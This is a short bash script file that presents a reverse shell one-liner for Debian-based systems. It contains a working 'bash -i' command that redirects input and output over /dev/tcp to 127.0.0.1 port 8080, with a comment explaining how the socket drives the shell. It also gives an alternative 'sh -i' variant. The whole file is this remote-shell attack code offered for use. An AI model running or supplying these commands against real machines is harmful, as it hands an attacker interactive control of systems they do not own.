# Reverse shell one-liner bash (debian-based)

#!/bin/bash


bash -i </dev/tcp/127.0.0.1/8080 1>&0 2>&0
# stdin coming from the connection interpreted by bash with stdout and stderr returned back to the connection (socket tcp) 

# or.... sh -i 1>&/dev/tcp/127.0.0.1/8080 0<&1
# only works on some systems...
